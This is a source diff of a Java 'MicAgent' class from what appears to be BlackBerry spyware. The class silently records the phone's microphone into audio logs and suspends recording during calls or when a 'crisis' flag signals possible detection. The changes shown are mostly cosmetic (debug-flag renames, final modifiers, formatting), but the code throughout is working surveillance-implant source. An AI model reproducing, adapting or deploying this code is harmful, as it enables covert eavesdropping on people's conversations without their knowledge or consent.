@@ -10,18 +10,15 @@
 package blackberry.agent;
 
 import net.rim.blackberry.api.phone.Phone;
-import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
-import blackberry.AppListener;
 import blackberry.Conf;
 import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
-import blackberry.interfaces.PhoneCallObserver;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.record.AudioRecorder;
@@ -98,7 +95,7 @@ public final class MicAgent extends Agent implements PhoneListener {
     }
 
     public synchronized void actualStart() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("start");
         //#endif
 
@@ -111,7 +108,7 @@ public final class MicAgent extends Agent implements PhoneListener {
                 //#endif			
                 startRecorder();
 
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("started");
                 //#endif
 
@@ -123,7 +120,7 @@ public final class MicAgent extends Agent implements PhoneListener {
     }
 
     public synchronized void actualStop() {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("stop");
         //#endif
 
@@ -140,7 +137,7 @@ public final class MicAgent extends Agent implements PhoneListener {
             state = STOPPED;
 
         }
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("stopped");
         //#endif
 
@@ -148,12 +145,12 @@ public final class MicAgent extends Agent implements PhoneListener {
 
     public void crisis(boolean value) {
         if (value) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("Crisis!");
             //#endif
             suspend();
         } else {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("End of Crisis!");
             //#endif
             resume();
@@ -161,19 +158,19 @@ public final class MicAgent extends Agent implements PhoneListener {
     }
 
     synchronized void startRecorder() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("startRecorder");
         //#endif
 
-        DateTime dateTime = new DateTime();
+        final DateTime dateTime = new DateTime();
         fId = dateTime.getFiledate();
 
         //#ifdef SAVE_AMR_FILE
-        String filename = Path.SD() + "filetest." + dateTime.getOrderedString()
-                + ".amr";
+        final String filename = Path.SD() + "filetest."
+                + dateTime.getOrderedString() + ".amr";
         debug.trace("Creating file: " + filename);
         amrfile = new AutoFlashFile(filename, false);
-        boolean ret = amrfile.create();
+        final boolean ret = amrfile.create();
         //ret &= amrfile.write(AudioRecorder.AMR_HEADER);
 
         Check.asserts(ret, "actualStart: cannot write file: " + filename);
@@ -182,7 +179,7 @@ public final class MicAgent extends Agent implements PhoneListener {
         recorder = new AudioRecorder();
         recorder.start();
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Started: " + (recorder != null));
         //#endif
 
@@ -194,18 +191,18 @@ public final class MicAgent extends Agent implements PhoneListener {
     }
 
     synchronized void stopRecorder() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("stopRecorder");
         //#endif
 
         if (recorder == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("Null recorder");
             //#endif
             return;
         }
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("STOP");
         //#endif
 
@@ -226,29 +223,29 @@ public final class MicAgent extends Agent implements PhoneListener {
 
         synchronized (stateLock) {
             if (state == STARTED) {
-               
+
                 if (numFailures < 10) {
                     saveRecorderLog();
                 } else {
-                    //#ifdef DEBUG_WARN
+                    //#ifdef DEBUG
                     debug.warn("numFailures: " + numFailures);
                     //#endif
 
                     suspend();
                 }
-                
+
                 if (status.callInAction()) {
-                    //#ifdef DEBUG_WARN
+                    //#ifdef DEBUG
                     debug.warn("phone call in progress, suspend!");
                     //#endif                   
                     suspend();
-                    
-                }else if(Status.getInstance().crisisMic()){
-                    //#ifdef DEBUG_WARN
+
+                } else if (Status.getInstance().crisisMic()) {
+                    //#ifdef DEBUG
                     debug.warn("crisis, suspend!");
                     //#endif                   
                     suspend();
-                } 
+                }
             }
         }
     }
@@ -258,7 +255,7 @@ public final class MicAgent extends Agent implements PhoneListener {
         Check.requires(recorder != null, "saveRecorderLog recorder==null");
         //#endif
 
-        byte[] chunk = recorder.getAvailable();
+        final byte[] chunk = recorder.getAvailable();
 
         if (chunk != null && chunk.length > 0) {
 
@@ -273,7 +270,7 @@ public final class MicAgent extends Agent implements PhoneListener {
                 offset = AudioRecorder.AMR_HEADER.length;
             }
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             if (offset != 0) {
                 debug.trace("offset: " + offset);
             } else {
@@ -284,11 +281,11 @@ public final class MicAgent extends Agent implements PhoneListener {
             log.close();
 
             //#ifdef SAVE_AMR_FILE    
-            boolean ret = amrfile.append(chunk);
+            final boolean ret = amrfile.append(chunk);
             Check.asserts(ret, "cannot write file!");
             //#endif
         } else {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("zero chunk: " + chunk);
             //#endif
             numFailures += 1;
@@ -302,7 +299,7 @@ public final class MicAgent extends Agent implements PhoneListener {
         final int LOG_AUDIO_CODEC_AMR = 0x01;
         final int sampleRate = 8000;
 
-        int tlen = 16;
+        final int tlen = 16;
         final byte[] additionalData = new byte[tlen];
 
         final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
@@ -325,13 +322,13 @@ public final class MicAgent extends Agent implements PhoneListener {
     private void suspend() {
         synchronized (stateLock) {
             if (state == STARTED) {
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Call: suspending recording");
                 //#endif
                 stopRecorder();
                 state = SUSPENDED;
             } else {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("suspend: already done");
                 //#endif
             }
@@ -340,14 +337,15 @@ public final class MicAgent extends Agent implements PhoneListener {
 
     private void resume() {
         synchronized (stateLock) {
-            if (state == SUSPENDED && !Status.getInstance().callInAction() && !Status.getInstance().crisisMic()) {
-                //#ifdef DEBUG_INFO
+            if (state == SUSPENDED && !Status.getInstance().callInAction()
+                    && !Status.getInstance().crisisMic()) {
+                //#ifdef DEBUG
                 debug.info("Call: resuming recording");
                 //#endif
                 startRecorder();
                 state = STARTED;
             } else {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("resume: already done");
                 //#endif
             }
@@ -365,29 +363,29 @@ public final class MicAgent extends Agent implements PhoneListener {
     }
 
     public void callIncoming(int callId) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("callIncoming");
         //#endif
 
-        MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
+        final MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
                 AGENT_MIC);
         agent.suspend();
     }
 
     public void callInitiated(int callid) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("callInitiated");
         //#endif
-        MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
+        final MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
                 AGENT_MIC);
         agent.suspend();
     }
 
     public void callDisconnected(int callId) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("callDisconnected");
         //#endif
-        MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
+        final MicAgent agent = (MicAgent) AgentManager.getInstance().getItem(
                 AGENT_MIC);
         agent.resume();
     }
